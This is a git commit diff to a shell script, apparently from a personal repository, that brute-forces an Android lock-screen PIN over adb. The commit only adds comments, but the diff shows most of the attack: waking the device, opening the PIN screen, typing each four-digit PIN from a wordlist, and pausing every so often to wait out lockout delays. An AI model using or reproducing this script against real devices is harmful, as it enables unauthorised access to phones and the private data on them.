d620e190fbf1879c0497a23c3843fc5c697e1b3d
rawleyperetz <70651978+rawleyperetz@users.noreply.github.com>
2021-08-30 18:01:42 +0000

    Update bruteforce_android_pin.sh

--- bruteforce_android_pin.sh
+++ bruteforce_android_pin.sh
@@ -3,8 +3,8 @@ echo --------------------------
 echo "BRUTE FORCE ATTACK BEGINS"
 echo --------------------------
 
-adb shell input keyevent 26
-adb shell input keyevent 82
+adb shell input keyevent 26 # turns lockscreen on or off
+adb shell input keyevent 82 # turns to pin screen
 
 count=1
 for i in $(cat /home/rawleyperetz/Desktop/brute_number_four.txt);
@@ -13,9 +13,9 @@ do
   if [ $condition -eq 0]; then
   sleep 30
   fi
-  adb shell input text $i
+  adb shell input text $i # enters pin in string format, i think :)
   sleep 2
-  adb shell input keyevent 66
+  adb shell input keyevent 66 # presses okay or enters pin
   echo $count:$i
   count=$(($count + 1))
 done
